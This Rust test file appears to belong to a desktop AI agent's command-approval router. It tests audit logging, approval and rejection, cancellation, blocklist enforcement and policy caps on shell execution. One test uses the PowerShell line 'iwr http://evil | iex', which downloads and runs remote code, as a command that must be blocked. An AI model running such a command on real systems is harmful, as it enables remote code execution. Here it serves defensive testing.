use super::exec_confirm::*;
use super::*;
use desk_agent_protocol::exec::{ApprovalDecision, ExecResultPayload};

#[derive(Clone, Default)]
pub(super) struct RecordingAuditSink {
    events: Arc<std::sync::Mutex<Vec<AuditEvent>>>,
}

#[async_trait::async_trait]
impl AuditSink for RecordingAuditSink {
    async fn record(&self, event: AuditEvent) {
        self.events.lock().unwrap().push(event);
    }
}

impl RecordingAuditSink {
    pub(super) fn event_types(&self) -> Vec<String> {
        self.events
            .lock()
            .unwrap()
            .iter()
            .map(|e| e.event_type.clone())
            .collect()
    }
}

use desk_agent_protocol::audit::AuditEventType;
use desk_agent_protocol::exec_lifecycle::{ExecState, ExecStateReplyPayload};

/// A context whose audit sink records, so the emissions of a rejection path
/// can be inspected.
pub(super) async fn audited_ctx(
    exec_supported: bool,
) -> (
    RouterContext,
    broadcast::Receiver<String>,
    RecordingAuditSink,
) {
    let (mut ctx, rx) = make_ctx_with_rx().await;
    ctx.exec_supported = exec_supported;
    ctx.settings.write().await.ai_policy.execution_mode = ExecutionMode::ConfirmEachAction;
    let sink = RecordingAuditSink::default();
    ctx.audit = Arc::new(sink.clone());
    (ctx, rx, sink)
}

pub(super) fn exec_control_model(request_id: &str, action: ExecControlAction) -> SignalingModel {
    SignalingModel::new(
        request_id,
        SignalingType::ExecControl,
        Some("conn-1".to_string()),
        None,
        Some(
            serde_json::to_value(ExecControlPayload {
                execution_generation: "gen-1".to_string(),
                action,
            })
            .unwrap(),
        ),
        None,
    )
}

/// Read the one `ExecStateReply` the router emitted.
pub(super) fn expect_state_reply(rx: &mut broadcast::Receiver<String>) -> ExecStateReplyPayload {
    loop {
        let text = rx.try_recv().expect("no frame was sent");
        let frame: SignalingModel = serde_json::from_str(&text).unwrap();
        if frame.signaling_type == SignalingType::ExecStateReply {
            return frame.get_data::<ExecStateReplyPayload>().unwrap();
        }
    }
}

/// A query about an execution the host never accepted reports `unknown`,
/// which the control end must not read as a settled outcome.
#[tokio::test]
pub(super) async fn a_query_for_an_unseen_generation_answers_unknown() {
    let (ctx, mut rx) = make_ctx_with_rx().await;
    handle_exec_control_inbound(
        &ctx,
        &exec_control_model("req-1", ExecControlAction::QueryState),
    )
    .await
    .unwrap();

    let reply = expect_state_reply(&mut rx);
    assert_eq!(reply.execution_generation, "gen-1");
    assert_eq!(reply.state, ExecState::Unknown);
    assert!(!reply.state.is_settled());
}

/// A query is answered from the durable ledger, so a running execution is
/// reported as running along with how the host would reclaim it.
#[tokio::test]
pub(super) async fn a_query_answers_from_the_ledger() {
    let (ctx, mut rx) = make_ctx_with_rx().await;
    ctx.exec_ledger
        .reserve("task-1", "gen-1", "fp-1", None)
        .await
        .unwrap();
    ctx.exec_ledger
        .mark_running("gen-1", Some("pgid:99"))
        .await
        .unwrap();

    handle_exec_control_inbound(
        &ctx,
        &exec_control_model("req-1", ExecControlAction::QueryState),
    )
    .await
    .unwrap();

    let reply = expect_state_reply(&mut rx);
    assert_eq!(reply.state, ExecState::Running);
    assert_eq!(reply.containment_identity.as_deref(), Some("pgid:99"));
}

/// A cancel reaches the worker as a stop for that exact generation, and is
/// still answered with the ledger's view rather than with the send's success.
#[tokio::test]
pub(super) async fn a_cancel_reaches_the_worker_and_still_answers_from_the_ledger() {
    let (ctx, mut rx) = make_ctx_with_rx().await;
    let (worker_tx, mut worker_rx) = tokio::sync::mpsc::unbounded_channel::<ServiceToWorker>();
    ctx.worker_mgr.install_active_for_test(worker_tx).await;
    ctx.exec_ledger
        .reserve("task-1", "gen-1", "fp-1", None)
        .await
        .unwrap();
    ctx.exec_ledger.mark_running("gen-1", None).await.unwrap();

    handle_exec_control_inbound(
        &ctx,
        &exec_control_model(
            "req-1",
            ExecControlAction::Cancel {
                requested_by: "operator:7".into(),
            },
        ),
    )
    .await
    .unwrap();

    match worker_rx
        .try_recv()
        .expect("the worker was not told to stop")
    {
        ServiceToWorker::ExecCancel(p) => assert_eq!(p.execution_generation, "gen-1"),
        other => panic!("expected an ExecCancel, got {other:?}"),
    }
    // Still running: a requested stop is not a terminal state, and reporting
    // one here would tell the upstream the command had ended when it had not.
    assert_eq!(expect_state_reply(&mut rx).state, ExecState::Running);
}

/// A cancel for an execution that already finished is not an error: it is
/// answered with the terminal state, which tells the upstream to stop asking.
#[tokio::test]
pub(super) async fn cancelling_a_finished_execution_reports_it_settled() {
    let (ctx, mut rx) = make_ctx_with_rx().await;
    ctx.exec_ledger
        .reserve("task-1", "gen-1", "fp-1", None)
        .await
        .unwrap();
    ctx.exec_ledger
        .mark_terminal(
            "gen-1",
            crate::daemon::exec_ledger::Terminal::Completed("{}".into()),
        )
        .await
        .unwrap();

    handle_exec_control_inbound(
        &ctx,
        &exec_control_model(
            "req-1",
            ExecControlAction::Cancel {
                requested_by: "operator:7".into(),
            },
        ),
    )
    .await
    .unwrap();

    let reply = expect_state_reply(&mut rx);
    assert_eq!(reply.state, ExecState::Terminal);
    assert!(reply.state.is_settled());
}

/// Every cancel is recorded, whether or not it stopped anything — a stop that
/// was asked for and never landed is precisely what an audit trail is for.
#[tokio::test]
pub(super) async fn a_cancel_is_audited_even_when_it_stops_nothing() {
    let (mut ctx, _rx) = make_ctx_with_rx().await;
    let sink = RecordingAuditSink::default();
    ctx.audit = Arc::new(sink.clone());

    handle_exec_control_inbound(
        &ctx,
        &exec_control_model(
            "req-1",
            ExecControlAction::Cancel {
                requested_by: "operator:7".into(),
            },
        ),
    )
    .await
    .unwrap();

    assert!(
        sink.event_types()
            .contains(&"ai.command.cancel_requested".to_string()),
        "the cancel was not recorded: {:?}",
        sink.event_types()
    );
}

/// A query changes nothing, so it is not an audit event and never reaches the
/// worker — asking must not be indistinguishable from acting.
#[tokio::test]
pub(super) async fn a_query_neither_stops_anything_nor_is_audited() {
    let (mut ctx, _rx) = make_ctx_with_rx().await;
    let sink = RecordingAuditSink::default();
    ctx.audit = Arc::new(sink.clone());
    let (worker_tx, mut worker_rx) = tokio::sync::mpsc::unbounded_channel::<ServiceToWorker>();
    ctx.worker_mgr.install_active_for_test(worker_tx).await;

    handle_exec_control_inbound(
        &ctx,
        &exec_control_model("req-1", ExecControlAction::QueryState),
    )
    .await
    .unwrap();

    assert!(worker_rx.try_recv().is_err(), "a query reached the worker");
    assert!(sink.event_types().is_empty(), "a query was audited");
}

/// A `ConfirmExec` whose payload cannot be parsed at all.
pub(super) fn malformed_confirm_exec_model(request_id: &str) -> SignalingModel {
    SignalingModel::new(
        request_id,
        SignalingType::ConfirmExec,
        Some("conn-1".to_string()),
        None,
        Some(serde_json::json!({ "operation": "not-an-object" })),
        None,
    )
}

/// A `ConfirmExec` carrying a read operation rather than an exec one.
pub(super) fn read_operation_confirm_exec_model(request_id: &str) -> SignalingModel {
    SignalingModel::new(
        request_id,
        SignalingType::ConfirmExec,
        Some("conn-1".to_string()),
        None,
        Some(process_list_request()),
        None,
    )
}

/// Every rejection of a `ConfirmExec` must report something. The manager
/// records its own authorization of the frame, so a path that returned a
/// preview but reported nothing would show up as a dispatch the host never
/// acknowledged — indistinguishable from a host suppressing its audit.
///
/// The two protocol errors are task failures (no capability has been
/// determined yet); the unsupported-mode refusal is a capability denial.
/// None of them may store the payload or the parser's message.
#[tokio::test]
pub(super) async fn every_confirm_exec_rejection_reports_an_event() {
    for (model, expected_type, expected_result) in [
        (
            malformed_confirm_exec_model("r1"),
            AuditEventType::TaskFailed.as_str(),
            "error",
        ),
        (
            read_operation_confirm_exec_model("r2"),
            AuditEventType::TaskFailed.as_str(),
            "error",
        ),
    ] {
        let (ctx, _rx, sink) = audited_ctx(true).await;
        handle_confirm_exec_inbound(&ctx, &model).await.unwrap();
        let events = sink.events.lock().unwrap();
        assert_eq!(events.len(), 1, "exactly one event per rejection");
        assert_eq!(events[0].event_type, expected_type);
        assert_eq!(events[0].result, expected_result);
        // Correlated by request id, which is the key the manager's own
        // authorization row carries.
        assert_eq!(events[0].request_id, model.request_id);
        assert!(
            events[0].task_id.is_none(),
            "a protocol rejection has no sub-call id"
        );
        // The summary is the error kind alone, never the payload or the
        // parser's message.
        assert_eq!(events[0].output_summary.as_deref(), Some("InvalidInput"));
    }

    // Exec unavailable in this startup mode: a real capability refusal.
    let (ctx, _rx, sink) = audited_ctx(false).await;
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r3", "Get-Service"))
        .await
        .unwrap();
    let events = sink.events.lock().unwrap();
    assert_eq!(events.len(), 1);
    assert_eq!(
        events[0].event_type,
        AuditEventType::CapabilityDenied.as_str()
    );
    assert_eq!(events[0].result, "denied");
    assert_eq!(events[0].request_id, "r3");
    assert_eq!(
        events[0].output_summary.as_deref(),
        Some("exec unsupported in this startup mode")
    );
}

#[tokio::test]
pub(super) async fn exec_flow_emits_audit_lifecycle() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    let recording = RecordingAuditSink::default();
    ctx.audit = Arc::new(recording.clone());

    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-Service -Name Spooler"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();
    assert_eq!(recording.event_types(), vec!["ai.capability.requested"]);

    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r2", exec_request_id.clone(), ApprovalDecision::Approve),
    )
    .await
    .unwrap();
    let types = recording.event_types();
    assert!(
        types.contains(&"ai.approval.granted".to_string()),
        "{types:?}"
    );
    assert!(
        types.contains(&"ai.capability.allowed".to_string()),
        "{types:?}"
    );
    assert!(
        types.contains(&"ai.command.executed".to_string()),
        "{types:?}"
    );
    // Every exec event correlates by the same exec_request_id.
    for e in recording.events.lock().unwrap().iter() {
        assert_eq!(e.request_id, exec_request_id.0);
    }
    // No manager link → no ledger → exec audit task_id stays unset.
    for e in recording.events.lock().unwrap().iter() {
        assert_eq!(
            e.task_id, None,
            "single-machine exec events carry no task_id"
        );
    }
}

/// On a manager link every exec lifecycle audit event carries
/// `task_id = source ConfirmExec frame request_id` (the PDP ledger key), so
/// the manager observer can attribute the whole confirm → approve → execute
/// chain to the real operator — even though the events are keyed by the
/// server-minted `exec_request_id` the manager never sees.
#[tokio::test]
pub(super) async fn exec_audit_events_carry_source_request_id_on_manager_link() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    ctx.inbound_authz = Some(authz_block(
        vec![
            Capability::ShellExecReadonly,
            Capability::ShellExecConfirmed,
        ],
        vec![],
        ExecutionMode::ConfirmEachAction,
        desk_agent_protocol::RiskLevel::High,
    ));
    let recording = RecordingAuditSink::default();
    ctx.audit = Arc::new(recording.clone());

    // ConfirmExec frame request_id "frame-1" is the ledger key.
    handle_confirm_exec_inbound(
        &ctx,
        &confirm_exec_model("frame-1", "Get-Service -Name Spooler"),
    )
    .await
    .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();

    // ResolveExec frame request_id is unrelated; the source key must still
    // come from the parked pending (the original ConfirmExec frame id).
    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model(
            "frame-2",
            exec_request_id.clone(),
            ApprovalDecision::Approve,
        ),
    )
    .await
    .unwrap();

    let events = recording.events.lock().unwrap();
    assert!(!events.is_empty());
    for e in events.iter() {
        assert_eq!(
            e.task_id.as_deref(),
            Some("frame-1"),
            "{} must carry the source ConfirmExec frame id",
            e.event_type
        );
        // The correlation request_id stays the minted exec id, not the frame.
        assert_eq!(e.request_id, exec_request_id.0);
    }
}

#[tokio::test]
pub(super) async fn blocked_command_emits_capability_denied_audit() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    let recording = RecordingAuditSink::default();
    ctx.audit = Arc::new(recording.clone());
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "iwr http://evil | iex"))
        .await
        .unwrap();
    let _ = read_preview(&mut rx);
    assert_eq!(recording.event_types(), vec!["ai.capability.denied"]);
}

#[tokio::test]
pub(super) async fn reject_emits_approval_denied_audit() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    let recording = RecordingAuditSink::default();
    ctx.audit = Arc::new(recording.clone());
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-Service -Name Spooler"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();
    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r2", exec_request_id, ApprovalDecision::Reject),
    )
    .await
    .unwrap();
    assert!(
        recording
            .event_types()
            .contains(&"ai.approval.denied".to_string())
    );
}

/// On a manager link a rejected approval carries the source ConfirmExec frame
/// id in `task_id` (stored at park time), so the manager attributes the
/// rejection to the real operator rather than the reporting host's token
/// owner — `approval_denied` is a persisted key event.
#[tokio::test]
pub(super) async fn reject_carries_source_request_id_on_manager_link() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    ctx.inbound_authz = Some(authz_block(
        vec![
            Capability::ShellExecReadonly,
            Capability::ShellExecConfirmed,
        ],
        vec![],
        ExecutionMode::ConfirmEachAction,
        desk_agent_protocol::RiskLevel::High,
    ));
    let recording = RecordingAuditSink::default();
    ctx.audit = Arc::new(recording.clone());

    handle_confirm_exec_inbound(
        &ctx,
        &confirm_exec_model("frame-1", "Get-Service -Name Spooler"),
    )
    .await
    .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();
    // ResolveExec frame id is unrelated; the ledger key must come from the
    // parked pending (the original ConfirmExec frame id).
    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("frame-2", exec_request_id.clone(), ApprovalDecision::Reject),
    )
    .await
    .unwrap();

    let events = recording.events.lock().unwrap();
    let denied = events
        .iter()
        .find(|e| e.event_type == "ai.approval.denied")
        .expect("approval_denied recorded");
    assert_eq!(denied.task_id.as_deref(), Some("frame-1"));
    // Correlation request_id stays the minted exec id, not the frame.
    assert_eq!(denied.request_id, exec_request_id.0);
}

#[tokio::test]
pub(super) async fn resolve_exec_from_other_connection_is_denied_and_keeps_pending() {
    let (ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-Service -Name Spooler"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();
    assert_eq!(ctx.exec_approvals.len(), 1);

    // A ResolveExec from a *different* connection must not consume or run it.
    let foreign = SignalingModel::new(
        "r2",
        SignalingType::ResolveExec,
        Some("conn-attacker".to_string()),
        None,
        Some(
            serde_json::to_value(ResolveExecData {
                exec_request_id: exec_request_id.clone(),
                decision: ApprovalDecision::Approve,
            })
            .unwrap(),
        ),
        None,
    );
    handle_resolve_exec_inbound(&ctx, &foreign).await.unwrap();
    // The owning connection's pending is preserved (not evicted by the
    // foreign attempt), and the attacker got the generic error result.
    assert_eq!(
        ctx.exec_approvals.len(),
        1,
        "foreign approve must not evict"
    );
    let res = read_response(&mut rx)
        .get_data::<ExecResultPayload>()
        .expect("ExecResult");
    assert!(matches!(res.outcome, AgentOutcome::Err(_)));

    // The owning connection can still approve.
    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r3", exec_request_id, ApprovalDecision::Approve),
    )
    .await
    .unwrap();
    assert_eq!(ctx.exec_approvals.len(), 0);
}

#[tokio::test]
pub(super) async fn resolve_exec_reject_consumes_without_result_frame() {
    let (ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-Service -Name Spooler"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();

    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r2", exec_request_id, ApprovalDecision::Reject),
    )
    .await
    .unwrap();
    // Pending consumed, no result frame for a rejection.
    assert_eq!(ctx.exec_approvals.len(), 0);
    assert!(rx.try_recv().is_err());
}

#[tokio::test]
pub(super) async fn approve_rejects_when_blocklist_changes_after_preview() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    ctx.inbound_authz = Some(owner_authz_block(ExecutionMode::ConfirmEachAction));
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-ChildItem C:\\"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();

    route(
        &command_blocklist_sync_model(
            vec![custom_blocklist_rule(
                "custom.get_child_item",
                "get-childitem",
            )],
            Some(1),
        ),
        &ctx,
    )
    .await
    .unwrap();

    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r2", exec_request_id, ApprovalDecision::Approve),
    )
    .await
    .unwrap();
    let result = read_response(&mut rx)
        .get_data::<ExecResultPayload>()
        .expect("policy-change ExecResult");
    match result.outcome {
        AgentOutcome::Err(error) => {
            assert_eq!(error.kind, AgentErrorKind::PermissionDenied);
            assert!(error.message.contains("policy changed"));
        }
        other => panic!("unexpected result: {other:?}"),
    }
    assert_eq!(ctx.exec_approvals.len(), 0);
}

#[tokio::test]
pub(super) async fn approve_rejects_when_local_mode_tightens_after_preview() {
    let (mut ctx, mut rx) = exec_enabled_ctx(ExecutionMode::ConfirmEachAction).await;
    ctx.inbound_authz = Some(owner_authz_block(ExecutionMode::ConfirmEachAction));
    handle_confirm_exec_inbound(&ctx, &confirm_exec_model("r1", "Get-ChildItem C:\\"))
        .await
        .unwrap();
    let exec_request_id = read_preview(&mut rx).exec_request_id.unwrap();
    ctx.settings.write().await.ai_policy.execution_mode = ExecutionMode::SuggestOnly;

    handle_resolve_exec_inbound(
        &ctx,
        &resolve_exec_model("r2", exec_request_id, ApprovalDecision::Approve),
    )
    .await
    .unwrap();
    let result = read_response(&mut rx)
        .get_data::<ExecResultPayload>()
        .expect("mode-change ExecResult");
    assert!(matches!(
        result.outcome,
        AgentOutcome::Err(ref error) if error.kind == AgentErrorKind::PermissionDenied
    ));
    assert_eq!(ctx.exec_approvals.len(), 0);
}

#[tokio::test]
pub(super) async fn agent_request_plane_permanently_rejects_exec() {
    let (ctx, mut rx) = make_ctx_with_rx().await; // Even with execution fully enabled, the raw AgentRequest plane refuses
    // exec — it must go through the confirm flow.
    let input = desk_agent_protocol::ExecInput {
        target: desk_agent_protocol::ExecTarget::Shell {
            shell: "powershell".to_string(),
        },
        command: "Get-Service -Name Spooler".to_string(),
        cwd: None,
        timeout_ms: 0,
        max_stdout_bytes: 0,
        max_stderr_bytes: 0,
    };
    let req = AgentRequestData {
        operation: AgentOperation {
            risk_hint: None,
            input: OperationInput::Exec(input),
        },
        reason: None,
        org_id: None,
    };
    let model = SignalingModel::new(
        "r1",
        SignalingType::AgentRequest,
        Some("conn-1".to_string()),
        None,
        Some(serde_json::to_value(req).unwrap()),
        None,
    );
    handle_agent_request_inbound(&ctx, &model).await.unwrap();

    let outcome = read_response(&mut rx)
        .get_data::<AgentOutcome>()
        .expect("AgentResponse");
    match outcome {
        AgentOutcome::Err(e) => assert_eq!(e.kind, AgentErrorKind::UnsupportedCapability),
        AgentOutcome::Ok(_) => panic!("exec must be rejected on the agent-request plane"),
    }
}

/// On a manager link the local `execution_mode` is an upper bound on the
/// authorization mode: a `SuggestOnly` local config caps a broad
/// `ConfirmEachAction` grant, so an otherwise-executable confirmed command
/// comes back non-executable. Without the `restrict_to` clamp the manager
/// mode would replace the local one and the command would be executable.
#[tokio::test]
pub(super) async fn confirm_exec_local_mode_caps_manager_authorization() {
    use desk_agent_protocol::authz::{
        AUTHORIZATION_BLOCK_VERSION, AuthorizationBlock, AuthzActor, AuthzDevice,
    };
    use desk_agent_protocol::{ExecInput, ExecTarget, RiskLevel};

    let (mut ctx, mut rx) = make_ctx_with_rx().await;
    ctx.exec_supported = true;
    // Local config: AI may only suggest, never execute.
    ctx.settings.write().await.ai_policy.execution_mode = ExecutionMode::SuggestOnly;
    // Manager authorization grants a far broader mode.
    ctx.inbound_authz = Some(AuthorizationBlock {
        version: AUTHORIZATION_BLOCK_VERSION,
        scope: AgentScope {
            granted: Vec::new(),
            mode: ExecutionMode::ConfirmEachAction,
            expires_at: None,
            policy_name: None,
        },
        orchestrator_grants: Vec::new(),
        max_risk: RiskLevel::Critical,
        exec_admission_policy: desk_agent_protocol::authz::ExecAdmissionPolicy::TemplateOnly,
        actor: AuthzActor { user_id: Some(1) },
        device: AuthzDevice { device_id: Some(1) },
        request_id: "r-exec".to_string(),
        session_id: None,
        expires_at: None,
        issuer: "test".to_string(),
        audience: "test".to_string(),
        signature: None,
    });

    let data = ConfirmExecData {
        operation: AgentOperation {
            risk_hint: None,
            input: OperationInput::Exec(ExecInput {
                target: ExecTarget::Shell {
                    shell: "powershell".to_string(),
                },
                // A whitelisted, ConfirmRequired command (would be executable
                // under ConfirmEachAction).
                command: "Get-Service -Name Spooler".to_string(),
                cwd: None,
                timeout_ms: 0,
                max_stdout_bytes: 0,
                max_stderr_bytes: 0,
            }),
        },
        reason: None,
        org_id: None,
    };
    let model = SignalingModel::new(
        "r-exec",
        SignalingType::ConfirmExec,
        Some("conn-1".to_string()),
        None,
        Some(serde_json::to_value(data).unwrap()),
        None,
    );
    handle_confirm_exec_inbound(&ctx, &model).await.unwrap();

    let preview = read_response(&mut rx)
        .get_data::<ExecPreview>()
        .expect("ExecPreview");
    assert!(
        !preview.executable,
        "local SuggestOnly must cap the manager ConfirmEachAction grant"
    );
}
